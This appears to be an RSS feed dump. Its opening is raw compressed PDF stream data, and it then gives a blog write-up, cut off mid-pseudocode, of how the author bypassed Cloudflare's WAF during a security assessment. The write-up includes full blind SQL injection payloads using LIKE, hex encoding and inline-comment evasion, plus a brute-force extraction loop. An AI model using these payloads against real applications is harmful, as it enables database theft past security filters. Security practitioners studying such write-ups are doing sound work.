Ä‘ÔðJ�Í%e8†ÍõJú„Ñ}ž¹´ßBtß1š“:Ì�ñä¶ÅiÇ-k¤ýå
¾ÿ
¤nÙfôñ1Ô�'5ÖÉ¾²âÜpæ	è÷èæÃç^ÎÛÏ´ÞÉëÄ®Š|ËŸÆ] 
�åœüPA–bQÄÇ¸ºâë€)|Ñ’¾×·}KÞ3,à!r­xÔ¯Ð}ø¤ƒy¤zìv˜¼�³ë÷�¸}ˆŒ@RH×ƒG?Fù"ZX¹ÙWõo4kÐ˜ÃžÊKAŒ3à‡vlÄ)f½ÙËÙ9¬x�Ìé&amp;d#Äg{8$h-ÜÁówÞ�SI4¼ô8¤K�ôA›ÝèC�±Ê¹&gt;ÃjÊ¶&gt;£ÐÎøÄ$	ú®úØ$�y~¾­oØKÒ’œ4L–‹­
/žÛ€°q&lt;×½Géá’©ÕR;˜XA:¾Ó\´‰ô•&lt;é~!]HþºžtåÝS	W©JXëg‚ßåÂ¡t:0áp~‘D1Ž¾±#À§�$ƒÓ¦¡x¿Z\iw¾äÔùú9£â0�I|ÅÓCH_åxþÐC§ÜE­¿}
á0	ïN�Ö˜(|f)­ŒµcóŠ£¹ŒÁ¥ÊmÚtvÞÞ³fú÷ç�¯ã(™MPA~Òkçe“dèôûC|ÎoÿXu�ä€«Õ5ÀUŒ’ÿ^ãPv½ÆÉÁjnCÐM§uºÉ–0ÉãßQ{”(Ä
„M÷“y�¾é¾žVž’9~iúwÅà•Zó¼Á…äeVýëDå@Öñ³?¸nHv±›õE±Š.uâç|‘‹)Ëº|]ÇÙ) �Ër_j—ü|"¸aOýRIs#ÐØzóõzô3‡ùªõ»›«ÿ@ß
endstream
endobj
99 0 obj
&lt;&lt;
/Length 2881      
/Filter /FlateDecode
&gt;&gt;
stream
xÚå[ÝoÛ8Ï_aÜ“Ô¬øM-p·‹ëâv�Û^›Û—¶ŠÍÄÚÚ’kÉÉ¥ýÍ�”-ÙŒšhu8´E�Š")r8¿ùâŒC	›¥ð�†çbs��”ðÙîvÖ6ßü½øúóÅ�W/_ñtfH¦”˜]ÝÌX¦¡­gŠk¢t6»ZÎÞ%»œsÁ“eQ/v¶)&gt;_Ò$oŠªôÝyÓä‹K–%á�jžÈËW¿|açøèËWÒtˆ™ÓŒ-ØlÎ8Q”zjêâ³u;üýêâÓõ'žQF‰�b¦hJ´Á£¿û�Î–0ö®ž™Ù½›¹ÁÙ)Éd6[ÏÞ^üËó&nbsp;·-eŒa`)AReÂ®ûëMQ×îÔT2“lóKø—olcwõ9A¢ÀÁ	b@�Ô¼OÐÎÞØ�-Ö£pS!;ÿ²um;ÿ´ÏËf¿ÁN–üT9‚íüíï¯#üKSÂ8wäJC‡èeYF”É&nbsp;ý(S‹©™JÑ-nš²Ça“°¦`ü¹lÙˆàÖÝu
²9×JÑ„2ó8J#÷�ÃÔÝÿ]«DÀ
^Ü]Ó‰»àÝïAãŒ¸ï¸Ð¢3vƒv´¾"�ßZ�;¡ë=åb±ÎAˆù€«ƒ‚1€’Ihø£y&nbsp;D:”1DÀ¶S%Q½%ò\íË¥,——s!)&nbsp;EÒå\ã¨ˆÂÕ£b,\æéhIÂSù(ZRž£•¯ýØÖ)0XßTlðú%´—û|}„SÎúhšL&nbsp;©5‘@Í$h0tæ²lvûíå\¥F%Jò(Ç‘‡²KÂX(›JóTËˆMæIq–Þ0å­ÿlõpí;–ƒjšÑ!`•"R¨i€U1\ø]›ÕÎÚk›ƒËbÁ¬^ç×èŽ£#Žn—ŽÑvu2tyÓÔaÈ8€LJð¼zÈ¤!FK¿+ªbkµ­Y*ŒÒz²qtÄ!ëÒ1Z!'s…¼UÈ«K0Kùõ:O´°fY•óuu9%ì"Ê…‹�zˆÒ”ÉH…!0Ó@* 2§êézÑž”€ê°}GCÎ.
ß’}�CkÌ´®$*›Z®`žöÛ~|¸¶,D¬4Ñj(dGAØ.c�ÕSÅ@ŒÆÔÔwØàÂò çÏÁ�ù@}™$YÖ^s�!?›¼(@GBÄ.	£ý#�J;‡ÝcLãK‡Ð¢&gt;NŸ-*IÊÃ¶¥½_U[&nbsp;Z¦\¡Ex�#"ŽW—ˆÑxM¥tœuðúXºtÂ}Hñ8øðÞñ%}“zPßRžO‚`*HjzWG4ŽÀ7Ž‚8|
þÿ×Fý§®�](Ã‘2ÍÒÂøX|
(EÆ	´ý¶7»jY÷§b‰ˆÊ‘D¡ìQ0K1™&amp;šÇ-çËW°B7C*9¯ü`KÒh_]f,¸M‘ª„Jü·=" .Ôâ@ÅÛâ³Å+�Î’êÆ?�)Ï0P”aÀ.ö»¢Añà{yco}˜zœ‡çyX]€SàM¦µrÜ•´ÍŒ“¶þÜçðÎýPŠW­ÎDâ—ýçÕ›{ç�{b®^ïŠ
Ú}!’¢öÏz»Â\ónYb™÷øŸµ¥ß½'Æp&gt;ËZ&gt;†ÄÇ9‘Ü‹X˜–—ËÈRnKLµsÚ ?²ƒ3<!--ñä¾qVpð4Æ�Æ�†¦áG±8då"òºÃõð�æœSbN¸~0×‘ƒi¢dv<˜×¨¡’ÁðèlnˆÌp¼�«§�ÅŒœ¤‚  ¬Fûòç*SPt°t]ŠþG%¤üð4%A-£ò	%Ïl¢Ëvo×'–Fî‡©»ÿWXBÌM
œ9ÑÕY€YgíÅõ™¹É‘tÄëÒñíå&¨v:ÍEY¤`ÍÚ[ê3S“ãÈˆÖ%ãÛÌLòìq@9DÏ©œQˆ?	oï±½Â�Vw±‘$DÑì‘ð}'&¹6�N“&á†nž™—I@×ßMZ’+M(Ÿ&MÂ5ðˆÑç¦%G’Ç°KÂ×˜–¤`JÐ’
X6M&„Ã�W¨ø"øà"FR¬KÅ×þƒˆ˜öQ5�Âå×…Þ“à)àú™òXÍnØ5Ž£!Žf—†oÝ5W8~"§ùQçšH!ž_AIDÛ.ßC�3µO‚ SDùÜÂHâøuIø–jÙSjœú }0©<&øž\CIAË._q
Aœ×¤IaÑœNÓ¯!¦]
A€Èt’ž4©}–pÎ¡
`°
€=m!seœ‹&G¶._¡	iP�çŸ Õz
·Q¯¤à-->�•”ç¤Æ–�’«•
†Üˆ¾Ä/ŠÆBÄÆ*ÓunÐùS\fP¡GÂÝ¹&lt;#pÚÚÞÙuíÛ&gt;KlÃKã¿ZÃ6GN–`çá(¼‹/8I"´hAzŸ¦±Ì» šª)X¸À&gt;ÞÕ6'=dçÿ]Ìggïí‘îÅ,lãý¹ò¹f4(Ž“L!›O8Ù¬Pô RºÍ·Ø`ñ
†›rÆjìl“ÕÀÏm\#wñ´ûdH&nbsp;ë#e¤ƒ¾s%×
Å#œ[8áÆ³¤ýC„ú*âë/¨‹ü	Õ$¸Sù…j’QLBjßT{ŒÂ°žäb²Ú?‘]ý#=¡@†u°´O))¥ …_&gt;ÍNÖš¦”;e³`*Ô®RW
›Ad¼tcw¨Ê¬SÄÔÉÃûTºät#S4è¦“uO¿é¬šar„öñ
w�“ý%ì.\»n­lA!ÈEêBgckâ~¥ÙêzÅ[è@�ˆÏ²jüÇ^iª»b…›‚QS�ÙV­+r�&amp;Xª¨[6(ô™Ó è]PåM^.ì‘S¦�v§�<rh �œx@4Äè9þ½Õ2¢rŸÐ8_€3ü¸pk@ñëâ#¾ÚÈÒ\ahwaú9é“m´&yz�vŸma¡1ä„…ÍÊymà="Àã" 4ÉÆÚæ(="" &©š•è;eîlÐ§}±³`|ÝÊØ¾ñ³ÛÏ–="" äÅøîv`¼ãp]÷="" 21n¤ýc|™þ‡Þ­búýqÎ“?öµ:áª="" ®«#ºŽo="" b“…="CõúòLÀàã,MêUµ_/}ÛË³i9`ýKuçÎˆ«kl¶«ÜG" ÔyëÏØ°kâg·z“)_Ú�û·Ú="" òÒvûÖ|ÃfÅí*è="" †³ºÏ®¸rÌ¹øµvdbû}jz$l;«ª%hØ[£ýxágpí="" ³ðbÿ“o¶k†‚lÁgÞ1aß:_|¬}g~\Àq±î�àûêf~p\úymçm5Ïï€·vŽïø-jÖr¿ý§u’oÁ,b2†›Ê?‹¦ö‚™ñ="" ©jéÓâ7ñstr�£�}«|[ÇÈ««�­Ê="" Þ÷Åzí[a“¢="" 1zø}«{Áþí[{j†ónƒ–¡'ñmÞ*k´ìw–‡`Øƒ}ÍÛÙoó“�uvb|«ÃÿÈaœ8ˆƒˆ6ó8�b¤g�jÿÞe�ß]8s…öÊ;ßŒààºoq‚&ÿ¸y#´õa‚Êžq�gqaÃ…üð="" œÄi˜Ç®ÆÙ×<c="" +ß¹x[ßï»óåb¨¯·­¥r”a="" Ç°Ü9Þ0røx´„i´…vw$ ì�h="®¦Ô¨dY€nrÿóˆÚwy9c™ì¹N7„ŸÕõ°¹Ý-¡ŽkØ�Bˆ,íâðí½“³ã¨Jê&amp;GÉ\º#î–p«ŠÂw—]ÓqãŸÍªªmûÇº=úqôx‘À_�0®‰oÿúlgøí‡—mð²ÝôVà" æƒï¶°•zà ^øïŸaÎ?="" îáòŽæÌµøˆ„'à2Ð5¡ŸÈc—cîfäÇÜïÓ -Þi\×Â¥ÿ¿<w ="" endstream="" endobj="" 168="" 0="" obj="" <<="" length="" 3180="" filter="" flatedecode="">&gt;
stream
xÚÕÙnäÆñ]_1€44ûâa »Ž7±ØÎJN¼û@qz4ÄrH™‡v'_ŸºÈ!g©µ×AbwuuwuUu]=*Ô›þ”|‹ãU´y€Æß®^Þ]}ñÊD›4ÌâØnîö›$	´b“„q’mîv›ŸƒøzkT¢ƒ¿æué+èX|âW/}[w½/ëë·wßNë~ñJg¥ÂÌ9�«F›­vai^Ð\o•Ò.xk$.(šãcÞ–]Ssÿû&lt;UÞûú†¿ûüÚ¨à	ÿ5-ƒ¾;Ý#u�o‘€/^¥›Î¢ãqWÚ˜7}Qé:Žƒ²Þ7í1ïKÜOÇ	x&nbsp;?”·:_œ‡a�¾j®áó~DõÜØ7•”õƒª²–A^ÆÚ²ï}=n¿X"�óè4hÊB&amp;5{çx &lt;ó‘q@ÜÓ#`ÀX¡/‹%Ýï¿¹½ÃV´^Úž‡úÃµ
ré0·}7yžÔ•ÿ�–
¶pöè¥�xh—÷9cËºpœ*KìÛæÈˆ?‹D¡Â[Ôn¾F•°ÉL6Æ¨0ŽŒÑ¹”»ÐŸ¹�Ö%#ê[â*aÅKîìQ+lj‚emS´ÍPï¶š¡&nbsp;QÀ/¿½Ï;Ô,÷uÑžYÖˆÒ
÷Ç²ë&nbsp;ßÝ0F+ÐiI¾ˆswh½éó¶cŒ¼[“Ôb3¸,Úe0Ósƒ9Š­GR.âhBÕ.e�ÁÏà§²6LŒý]ü¤½†NhÂX°uô}[LÙ›ÈEmJÓòXÈëÅ´âTT~;1�e¥\ªL-ÄËÂ‚
8mbt¬]¾(ßDÊ‚^W'(ÊGØ°÷zA$ÒLläà“ó©9:x¬†NZÃ}UÛwH)éþi!H±8S¨´&amp;31Ü²,VÇPÿá±ÊK¸e5-´c”#~?GŽ&amp;S`ÑçËñ†÷ºõR *
š·!7ïÈÀ!½“�CðÙÞÊ(œ
�ÒKÁ�Íõ
Û\°°g¢œ­Ñ#QïËþÐ(PžiºJÆ%b}`n©o«“¤£ÉqhrœÂûÑwx¥aš¥3cØ[‹ÞËÖµå!ò(í6$¾~}wõË•bï8º&gt;‹Æ°(¸ÉŸßF›Œ�N„@ï	ó¸1Ö…©FÎW›Û«^Á(�&nbsp;d¥ùZœ«Ífô¦°²V›áô”‰¾»F{u_ïÁ±š�4ÍZhiiåõn4yÄS�÷uÏâ$¢t(}PYYnß&amp;#�­!t.­! Ï¬!‹Ÿl!ýîîþØ±÷GÇïä3ò)@›xïÒ6]tøùÒ±°áøçM@_&gt;y¸þ`]%ÎÓ‰j¾t2[:g~pgçÑ€Ôpª»ŒÚ¡“4EàNÞñ—Îq{ñõíVéôfÖË´ôè#X»;YÀå4.É´î¯Òà!qìß×3’ª®Y3GØœ.ÅF.‚KõNnMÄ7“yÎÁÀzÑ-lOÊ@Èg	�¢ùÃbYÅ°7ü½ÀÔõ‚^›njWŸð…|g.–ïiÏ$?ø^Ø‚á3�Â�¾õõCè¸Kêó�Ü{¦Ž.÷fM{GÛÌ‡üIZ¬Ó9Sètvæ%ÝŽl*&nbsp;Á—¯‘`¨I1|è8FÈ4¢`¶ýeÈë~82ð«F&nbsp;·ÿú‘UûÙ[öÜBàR�~×ª”±Žt3;´þ�©ÛñžJJla8üžÎÛ2#Küž‰‚žsè=3ÊáG†j7n³
¿z�h7`Gî
ÈkÐvÆž¥o�ÍÇ
Ý£k@p/žÉ%°½è¥Ýñ(\ö¹\Þöò&nbsp;“¡
‘ßç…V©W56"ºŒU°*FÅÌ	ìÏ8�hƒ°±æ.Üð/¹5Ê½?KÁ_ñMaéÒ‚•reµ™�Â�ï‡‹ë"W&lt;‹þŒÉ�¢ð&amp;
uìØõ)5ó%6
�ž\ß_ÄÏ½�
³trÄ°L¦1Œá•‰ð?2;	/N�‹œ á³¡Ü«.dÀßó'ð*x˜^\ÒtgBw.÷ÒÎ�ºˆ9Àn&gt;©<d¶Ûa‚Øúè�8gi.¢qr_�"7Þfyßñ4Ð"6kØ‘À¤¼¦og~�½™Î€ ¹…%ˆm¢¿d™Ð–s—ðá°;n¶Èá´¦il="" çÒ�«†#p¼çmß«mÊù©m(v·)¹ß="">Ñ5cHµ4"b¿‰�Ï¥,Ù¦K¢Ä¥ÁðíÜÚ#ë^‘ì"öô	ÜÚóñ8M1‘ã(gÉ†È�á?´.T e½+Ñ¡‘¾BŸr1�‚}`Ë€«~´"Ø
Xóä�k°ãoÎXÏå‡K-!±(<zhØic§+jx‰s†äu^�º�¢q`aƒ(d†vÙ3 m‰“ó½ç©nfÏ0Â¹à‹“¥x–c_«ì‚Õ„¨ÁÖ¬˜ ·Ñl—½hò¨h‹€o¢4@ü¦4iÉ iÊÃŽo×}ÉÙÌj¸="" öÍÎ¬wf‰¢²ÐÄŠ‰–%Ÿ\`aþ°5ÕúÀÆt¾$Ïq:%]o"ívìi&v2¸š\d„šôlpm+‘?„�²Ù="" ø¬”½°ÜegË­b½bŒ‚ì="" …+2Û="" ldejåex{f;w.‚9ŒŸxfsØ4e"Ü…d$üíâÚbn£c6î©Õt�eúÿx`æ×¦·ÀÌm`b§0çú,þ}s¿&0#)@…i’’µ³`õ–©Š‰Æteg�Û`»w="" f€@ÿ�2¦="" Ú�lùÇœÿw¤„]ätåcç�ãaÂŸcà6ù="" ¿fïxuÉ”g“Ëþy?m1{”p4]‘Çeb#É•qdwj£nzn4Àsc±<â1¬mØ="" kl…ÙÑl÷˜cpØé="" 6ð³ÜpoÚa¬Ð’p„ž‹s�dnqá³w="" #rý$¡qô´±ôrþtp“cg@;w‡†Ò'Ëa6‚�Ç¡ž"z_0¡õîÀgÃv�¹%"µ�•–5†+="">ZÊ­SGÉ\œTeÜBÝ&nbsp;�c.Â:¿¬(Æ Ñx¼ïN÷¾ujívX°ÓUEÆ¯,†ŠqªòáÐwùýøP³XÍ9¸ùêl\t?&gt;q0É‰‰¹qO,„0n,LÞ`RN^¥ì³ÕÆ…Y–.¥ËÓ×ˆ5¡=ÛÕ};&lt;ÆÎ¬ÑªÂHgsZÓ,B²dIƒÖY“D@Òdp³Ãc§#›ÆI²f“P¥ó3£VvÆ‘m–²!d©F[­tèÒ‹ªîª6YAkþÎ´	»`¹Á·l]›&nbsp;©…6%qº®MYò+Ú”…:šØþœ"Ès“ôEBjU”¦ÜºÔ$¬~Ì5)
Èr1f²ª4ÀIw¡c¬&lt;©[“¤ÃB²�Ó§TjÙð6gí‘’ÖŠö€÷:_&gt;ÑeqªÕšöÄ¡³ñbOm¢•=ÇzTšAš~‘§Ïm	i*Dcƒ³–+ø¢9ýPƒÑçº¦Œ•5yßËì¥-6lôM”{ÿžûË"!Èi`ƒò„ò	G4wÇ[teøâ#IÿÑc�'dàähc…%FHÖ¨Æ#èÚüÁs«TÄ÷¤9� _+ä».ö_3àj°‚
ëbZçUŸ±Oi|÷yQVXóÜJéW�¢™Í8¢»:§q)ª¦£úuÎõMÞqv¢�Q^«ò½ðË¤yK“d"øSu›G¸²‡C½àJ¾L°ãP¾d0•WÆµ)œÉ%�ÈÐ9¿@RWä•ÀÉí!¨¤£—RHzö4|¢™êï.x…�¡ÅäuL€ox„¤&lt;ê¹ÍA�V­Ïw'ît(¤�Ì[Æ„qü)eÁ7ÊX)1Üƒ©yòí»²ªþÄÝÏyW×i˜èÉÂ8ûÛÃù‹ga±ã‚þýx½ðyM²É@6®c[t";?µ`�F‘Ôñ‘~•0þîßÈqü)dÑôÔ‘KÝ‡ªðÀ ¾*N†b‹ç
Á¥gCjQçÒÙëvü‡�Ô
÷~ºåïcŽqZÇ�,Ê,˜GîpX�Pmã8qÜÁ0§{`oÆ¤ó÷Ç5­äøUÅÁm&gt;¢Ý0`zFå:?ï0þ¿¿{ýSÈÍ—#ÒxI±}�§
?ÎÏûË:ä|ùnÜx½D=‰Ôj‡OZMõDÞz»¡eÊ´&lt;82_ið›�V�\€Ïñøålëiã‹&lt;-	Ïhf¡û8´ümz¿ÖNŽ�{Ð&amp;Á#28_¿_ß]ýª*ƒš
endstream
endobj
176 0 obj
&lt;&lt;</zhøic§+jx‰s†äu^�º�¢q`aƒ(d†vù3></d¶ûa‚øúè�8gi.¢qr_�"7þfyßñ4ð"6kø‘à¤¼¦og~�½™î€></rh></eó@nz½fžÿµuýò!ß`¡"bteæ\l[ûòž<¸�1`÷{§oµ�„ëì˜êá×÷yq|áã—$ê‰vq”v^?tý«3¹àô��ë¯?òú¨></f^�ýðwœþô></w¼vn²�—æï�ã¬5üº$></hp€ãžõémpñx;·h.±ë></qvñü2›7·<></m¥·wê€¡�?@däû»0ôìpwj@™€4></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/papers/categories-20200918.pdf">https://cr.yp.to/papers/categories-20200918.pdf</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/papers/categories-20200918.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520781</guid>
            <pubDate>Fri, 18 Sep 2020 19:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I bypassed Cloudflare's SQL Injection filter]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 84 (<a href="https://news.ycombinator.com/item?id=24520556">thread link</a>) | @gskourou
<br/>
September 18, 2020 | https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html | <a href="https://web.archive.org/web/*/https://www.astrocamel.com/web/2020/09/04/how-i-bypassed-cloudflares-sql-injection-filter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">Astrocamel</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-09-04">04 Sep 2020</time>
            
                on Web
            
        </span> -->

        <!-- <h1 class="post-title">How I bypassed Cloudflare's SQL Injection filter</h1> -->

        <section>
            <p>In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn’t be exploited using the tool.
The reason: Cloudflare’s WAF and more specifically its SQL Injection filter.</p>

<h4 id="details-about-the-application">Details about the application</h4>
<p>The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don’t remember the use of the form
and it doesn’t really matter for the writeup. The POST request looked like this:</p>

<figure><pre><code data-lang="http"><span>POST</span> <span>/index.php</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>******</span>
<span>Connection</span><span>:</span> <span>close</span>
<span>Accept-Encoding</span><span>:</span> <span>gzip, deflate</span>
<span>Accept</span><span>:</span> <span>*/*</span>
<span>Content-Type</span><span>:</span> <span>multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3</span>

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--</code></pre></figure>

<p>The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>X</span><span>-</span><span>MARK</span><span>;</span></code></pre></figure>

<p>The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.</p>

<p>To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'a'</span><span>;</span></code></pre></figure>

<p>the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'a'</span><span>=</span><span>'b'</span><span>;</span></code></pre></figure>

<p>the server responded with status 500 Internal Server Error.</p>

<p>In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.</p>

<h4 id="first-try">First Try</h4>
<p>My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to ‘a’ and if not I would
continue with ‘b’, ‘c’ etc. I would start by inject the following string (for
comparison with ‘a’):</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>which would result in the following SQL query to be executed on the server:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span>
<span>WHERE</span> <span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>table_name</span><span>,</span> <span>2</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>tables</span>
  <span>LIMIT</span> <span>4</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>When I found the table name to be t1 for example, I was to brute force its
columns’ names with the following starting injection:</p>

<p><em>INJECTION 1</em></p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>and then actually get values out of column c1 of table t1 by starting with the
following injection:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>c1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>t1</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The idea was good, but Cloudflare would complain about the ‘=’ sign. The
injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>=</span> <span>'b'</span></code></pre></figure>

<p>would get blocked by Cloudflare’s WAF. After a bit of fiddling, I came up with
the following request that bypassed the ‘=’ restriction:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>This means that the initial injection <em>INJECTION 1</em> would become:</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="second-try">Second Try</h4>
<p><em>INJECTION 1</em> was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection</p>

<figure><pre><code data-lang="sql"><span>'a'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>would still get blocked, not because of the LIKE keyword, but because of the ‘a’
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>The above injection sends the character ‘a’ as the hex-encoded value ‘0x61’
which still allows it to work:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'a'</span></code></pre></figure>

<p>still returns True, and</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>passes through undetected and returns False.</p>

<p>The resulting <em>INJECTION 1</em> now looks like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<h4 id="third-try">Third Try</h4>
<p>The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span> <span>FROM</span> <span>t1</span> <span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>but with a multi-line comment trick, the new query would go through undetected:</p>

<figure><pre><code data-lang="sql"><span>SELECT</span><span>/*trick comment*/</span> <span>c1</span><span>,</span><span>c2</span><span>,</span><span>c3</span>
<span>FROM</span><span>/*trick comment*/</span> <span>t1</span>
<span>WHERE</span> <span>'0x61'</span> <span>LIKE</span> <span>'b'</span></code></pre></figure>

<p>Thus, applying this method on <em>INJECTION 1</em>, would make it look like this:</p>

<figure><pre><code data-lang="sql"><span>'0x61'</span> <span>LIKE</span>
 <span>(</span><span>SELECT</span><span>/*trick comment*/</span> <span>SUBSTRING</span><span>(</span><span>column_name</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>)</span>
  <span>FROM</span><span>/*trick comment*/</span> <span>information_schema</span><span>.</span><span>columns</span>
  <span>WHERE</span> <span>table_name</span> <span>=</span> <span>"t1"</span>
  <span>LIMIT</span> <span>0</span><span>,</span> <span>1</span>
 <span>)</span></code></pre></figure>

<p>The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character ‘a’ matches the first character of the first column’s name of table
t1.</p>

<h4 id="full-speed-ahead">Full Speed Ahead</h4>
<p>To make the retrieving of table contents from the application’s database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:</p>

<figure><pre><code data-lang="python"><span># assert names of columns and table name is known
</span><span>alphabet</span> <span>=</span> <span>[</span><span>a</span><span>,</span><span>b</span><span>,</span><span>c</span><span>,...,</span><span>y</span><span>,</span><span>z</span><span>]</span>
<span>characterPosition</span> <span>=</span> <span>1</span> <span># the position of the character we are bruteforcing
</span><span>for</span> <span>rowNumber</span> <span>in</span> <span>[</span><span>0</span><span>,</span><span>20</span><span>]:</span>
  <span>for</span> <span>columnName</span> <span>in</span> <span>columns</span><span>:</span>
    <span>for</span> <span>character</span> <span>in</span> <span>alphabet</span><span>:</span>
      <span>sqlInjection</span> <span>=</span> <span>'''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''</span>

